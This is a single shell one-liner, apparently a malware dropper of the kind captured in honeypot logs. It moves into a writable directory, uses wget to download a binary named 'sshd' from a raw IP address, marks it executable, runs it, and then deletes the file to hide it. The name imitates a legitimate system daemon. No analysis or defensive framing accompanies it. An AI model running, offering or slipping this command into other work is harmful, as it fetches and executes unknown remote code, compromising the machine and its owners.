cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://104.238.133.230/sshd; chmod +x sshd; ./sshd; rm -rf sshd
